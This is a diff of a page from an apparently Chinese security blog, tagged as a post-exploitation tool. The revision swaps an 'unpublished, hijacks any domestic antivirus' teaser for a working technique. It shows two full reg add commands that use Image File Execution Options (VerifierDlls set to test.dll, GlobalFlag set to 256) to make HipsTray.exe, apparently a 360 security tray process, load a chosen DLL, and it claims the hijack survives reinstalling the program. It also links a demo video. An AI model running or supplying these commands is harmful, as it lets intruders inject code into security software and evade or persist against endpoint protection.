@@ -81,18 +81,18 @@
 
 
 
-<meta name="description" content="Powerful inject 暂不公开，可劫持国内任意杀软启动。   your browser does not support the video tag">
+<meta name="description" content="Powerful inject 镜像劫持，指定进程加载指定dll 重装程序劫持依旧生效。  12reg add &quot;hklm\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HipsTray.exe&quot;  /v VerifierDlls /t REG_SZ /d test.dll">
 <meta name="keywords" content="后渗透工具">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Powerful inject">
 <meta property="og:url" content="https://github.com/scareing/scareing.github.io/2021/01/07/Powerful inject/index.html">
 <meta property="og:site_name" content="scareing的学习笔记">
-<meta property="og:description" content="Powerful inject 暂不公开，可劫持国内任意杀软启动。   your browser does not support the video tag">
+<meta property="og:description" content="Powerful inject 镜像劫持，指定进程加载指定dll 重装程序劫持依旧生效。  12reg add &quot;hklm\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HipsTray.exe&quot;  /v VerifierDlls /t REG_SZ /d test.dll">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2021-01-20T12:43:44.038Z">
+<meta property="og:updated_time" content="2022-01-16T12:06:46.293Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Powerful inject">
-<meta name="twitter:description" content="Powerful inject 暂不公开，可劫持国内任意杀软启动。   your browser does not support the video tag">
+<meta name="twitter:description" content="Powerful inject 镜像劫持，指定进程加载指定dll 重装程序劫持依旧生效。  12reg add &quot;hklm\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HipsTray.exe&quot;  /v VerifierDlls /t REG_SZ /d test.dll">
 
 
 
@@ -355,8 +355,11 @@
 
       
         <h1 id="Powerful-inject"><a href="#Powerful-inject" class="headerlink" title="Powerful inject"></a>Powerful inject</h1><blockquote>
-<p>暂不公开，可劫持国内任意杀软启动。</p>
+<p>镜像劫持，指定进程加载指定dll</p>
+<p>重装程序劫持依旧生效。</p>
 </blockquote>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add "hklm<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>OW6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options<span class="symbol">\H</span>ipsTray.exe"  /v VerifierDlls /t REG_SZ /d test.dll</span><br><span class="line">reg add "hklm<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>OW6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options<span class="symbol">\H</span>ipsTray.exe"  /v GlobalFlag /t REG_DWORD /d 256</span><br></pre></td></tr></table></figure>
+
 <p><video src="https://microsofts.oss-cn-hongkong.aliyuncs.com/Picture/360.mp4" controls="controls" style="max-width: 100%; display: block; margin-left: auto; margin-right: auto;"> your browser does not support the video tag </video></p>
 
       
